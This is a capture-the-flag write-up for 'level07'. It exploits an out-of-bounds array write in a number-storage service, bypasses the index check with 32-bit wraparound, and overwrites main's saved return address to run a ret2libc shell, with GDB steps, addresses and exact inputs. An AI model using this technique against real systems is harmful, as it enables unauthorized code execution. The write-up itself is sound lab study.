# level07

1. Overview

   * Interactive "number storage" service with three commands: `store`, `read`, `quit`.
   * A fixed array `local_1bc[100]` (in `main`'s stack frame) is used as the backing store. The helper `store_number(int *base)` writes:

     ```c
     *(uint *)(base + index*4) = value;   // NO bounds check
     ```
   * Input validation tries (and fails) to prevent exploitation:

     * Rejects **indices divisible by 3**.
     * Rejects **values** whose most significant byte equals `0xb7` (intended to block writes of typical `0xb7xxxxxx` libc pointers on some systems).
   * Strategy: classic **stack overflow by out‑of‑bounds array write** → overwrite **`main`'s saved return address** with `system`, place a fake return, then the `"/bin/sh"` pointer (ret2libc).

2. Relevant code (pseudo‑C)

```c
int store_number(uint *base) {
  printf(" Number: ");  unsigned value = get_unum();
  printf(" Index: ");   unsigned index = get_unum();
  if ((index % 3 == 0) || (value >> 24 == 0xb7)) {
    puts("This index is reserved for wil!");
    return 1;
  }
  *(unsigned *)(base + index*4) = value;  // OOB write into main's stack
  return 0;
}
```

`read_number` just prints `data[index]` and is not directly exploitable. `get_unum` uses `scanf("%u")` and clears stdin.

3. Memory layout & idea

* `base` (argument to `store_number`) points to `local_1bc[0]` in `main`'s stack frame.
* By choosing a large **index**, we write **past** `local_1bc[99]` and into the area where `main` keeps its **saved EIP** (return address) and subsequent stack words.
* Plan for ret2libc:

  ```
  data[index]     = system @ libc            // overwrites saved RET of main
  data[index + 1] = 0x41414141              // fake return address after system
  data[index + 2] = address of "/bin/sh"   // first arg to system
  ```

4. Deriving the exact index (with GDB)

Breakpoints and observations (as performed):

```gdb
(gdb) b store_number       # stop at the function entry
(gdb) b *0x080489f1        # just before main returns (RET site)
(gdb) run
Input command: store

# At store_number entry, the first argument (base) is at [EBP+8]
(gdb) x/xw $ebp+0x8
0xffffd530:  0xffffd554   # base = 0xffffd554

# Find libc mapping and useful symbols
(gdb) info proc map        # libc range e.g. 0xf7e2c000 - 0xf7fd0000
(gdb) find 0xf7e2c000,0xf7fd0000, "/bin/sh"
0xf7f897ec                 # "/bin/sh"
(gdb) info functions system
0xf7e6aed0  system         # system

# Break right before main returns to capture the saved RET location
(gdb) c
Input command: quit

Breakpoint ... at 0x080489f1 in main
(gdb) p/x $esp
$esp = 0xffffd71c           # address that RET will pop (saved EIP)
```

Compute the index that targets the saved RET:

```
index_raw = (saved_ret - base) / 4
          = (0xffffd71c - 0xffffd554) / 4
          = 0x1c8 / 4 = 114
```

Problem: `114 % 3 == 0` → **rejected**.

Bypass using 32‑bit wraparound: adding `2^30` to the index preserves the effective byte offset because `(index + 2^30) * 4 ≡ index*4 (mod 2^32)`, while flipping the modulo‑3 class (since `2^30 ≡ 1 (mod 3)`).

```
index = 114 + 2^30 = 1073741938   # accepted, same target address
```

5. Final addresses (example from the session)

* `system` = `0xf7e6aed0` = **4159090384**
* `"/bin/sh"` = `0xf7f897ec` = **4160264172**

Both pass the value check (`value >> 24 != 0xb7`, here top byte is `0xf7`).

6. Exploit steps (interactive)

```
Input command: store
 Number: 4159090384           # 0xf7e6aed0 (system)
 Index:  1073741938           # 114 + 2^30 → saved RET

Input command: store
 Number: 1094795585           # 0x41414141 (fake RET after system) — optional
 Index:  115

Input command: store
 Number: 4160264172           # 0xf7f897ec ("/bin/sh")
 Index:  116

Input command: quit           # triggers return from main → ret2libc
```

On return, `EIP` is set to `system`, it executes with the stack already arranged so the first argument is the `"/bin/sh"` pointer, and you get a shell.

7. Token

Token found `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`
